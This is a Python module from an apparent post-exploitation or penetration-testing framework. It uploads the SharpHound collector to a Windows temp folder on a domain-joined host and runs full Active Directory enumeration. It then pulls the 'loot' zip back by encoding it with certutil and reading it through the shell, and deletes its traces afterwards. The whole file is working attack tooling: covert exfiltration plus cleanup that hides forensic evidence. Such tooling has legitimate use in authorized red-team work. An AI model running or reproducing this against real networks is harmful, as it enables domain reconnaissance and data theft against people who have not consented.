"""SharpHound wrapper: on a domain-joined Windows context, run BloodHound
collection and retrieve the zip via certutil base64 (no download channel needed).
Best-effort for large collections — documented in the README. Heavy + domain gated."""
from __future__ import annotations

import base64

from ...models import Finding
from ..base import Module, register
from ._util import heavy_enabled, resolve_tool, save_bytes, skip

_CANDIDATES = [
    "SharpHound.exe",
    "/usr/share/sharphound/SharpHound.exe",
    "/usr/lib/bloodhound/resources/app/Collectors/SharpHound.exe",
]


@register
class SharpHoundWrapper(Module):
    name = "sharphound"

    def triggers(self, ctx) -> bool:
        return ctx.os == "windows" and ctx.domain_joined and heavy_enabled()

    def collect(self, session):
        local = resolve_tool(_CANDIDATES, "REAP_SHARPHOUND")
        if not local:
            return skip("SharpHound", "binary not found (set REAP_SHARPHOUND)", self.name)
        remote = r"C:\Windows\Temp\sh.exe"
        outdir = r"C:\Windows\Temp\bh"
        try:
            session.upload(local, remote)
        except Exception as exc:
            return skip("SharpHound", f"upload failed: {exc}", self.name)

        session.exec(f'mkdir "{outdir}"')
        run = session.exec(
            f'"{remote}" -c All --outputdirectory "{outdir}" --zipfilename loot',
            timeout=480,
        )
        findings = [Finding(type="info", title="SharpHound collection run", severity="medium",
                            detail=run.stdout.strip()[:200], source_module=self.name)]
        findings += self._retrieve_zip(session, outdir)
        session.exec(f'del /f /q "{remote}"')
        session.exec(f'rmdir /s /q "{outdir}"')
        return findings

    def _retrieve_zip(self, session, outdir) -> list[Finding]:
        listing = session.exec(f'dir /b /s "{outdir}\\*.zip"', timeout=30).out.strip()
        if not listing:
            return [Finding(type="info", title="BloodHound zip not found", severity="low",
                            detail="collection may have failed", source_module=self.name)]
        zip_path = listing.splitlines()[0].strip()
        b64_path = outdir + r"\bh.b64"
        session.exec(f'certutil -f -encode "{zip_path}" "{b64_path}"', timeout=60)
        raw = session.exec(f'type "{b64_path}"', timeout=120).stdout
        body = "".join(ln for ln in raw.splitlines() if "CERTIFICATE" not in ln)
        try:
            data = base64.b64decode(body)
            path = save_bytes(session.host, "bloodhound.zip", data)
            return [Finding(type="info", title="BloodHound zip retrieved", severity="high",
                            detail=str(path), source_module=self.name)]
        except Exception as exc:
            return [Finding(type="info", title="BloodHound zip retrieval failed",
                            severity="low", detail=str(exc), source_module=self.name)]
